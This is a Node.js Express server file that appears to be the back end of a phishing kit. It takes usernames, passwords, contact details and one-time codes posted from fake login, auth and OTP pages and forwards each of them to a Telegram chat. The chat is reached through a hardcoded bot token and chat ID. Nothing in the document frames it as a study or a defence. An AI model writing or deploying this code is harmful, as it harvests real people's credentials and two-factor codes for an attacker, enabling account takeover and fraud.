const express = require("express");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const app = express();

// Telegram bot credentials (hardcoded as requested; use environment variables in production)
const TELEGRAM_BOT_TOKEN = "7709941137:AAF8zjnw0zcyKeUGZp4XTbxq7qM3HUii0Ko";
const TELEGRAM_CHAT_ID = "8055889698";

// Initialize Telegram bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Middleware to parse form and JSON data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from public directory
app.use(express.static(path.join(__dirname, "public")));

// Handle POST request for login form (index.html)
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log("Received login data:", { username, password });

  // Send login data to Telegram
  const loginMessage = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, loginMessage)
    .then(() => {
      console.log("Login data sent to Telegram");
      res.redirect("/auth.html");
    })
    .catch((error) => {
      console.error("Error sending login data to Telegram:", error.message);
      res.status(500).send("Error sending login data to Telegram");
    });
});

// Handle POST request for authorization code form (auth.html)
app.post("/auth", (req, res) => {
  const { contact } = req.body;
  console.log("Received auth code request:", { contact });

  // Send auth code request to Telegram
  const authMessage = `Authorization code request:\nContact: ${contact}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, authMessage)
    .then(() => {
      console.log("Auth code request sent to Telegram");
      res.redirect("/otp.html");
    })
    .catch((error) => {
      console.error("Error sending auth code request to Telegram:", error.message);
      res.status(500).send("Error sending auth code request to Telegram");
    });
});

// Handle POST request for OTP form (otp.html)
app.post("/otp", (req, res) => {
  const { code } = req.body;
  console.log("Received OTP:", { code });

  // Send OTP to Telegram
  const otpMessage = `OTP submitted:\nCode: ${code}`;
  bot.sendMessage(TELEGRAM_CHAT_ID, otpMessage)
    .then(() => {
      console.log("OTP sent to Telegram");
      res.send("Authorization code submitted successfully!");
    })
    .catch((error) => {
      console.error("Error sending OTP to Telegram:", error.message);
      res.status(500).send("Error sending OTP to Telegram");
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
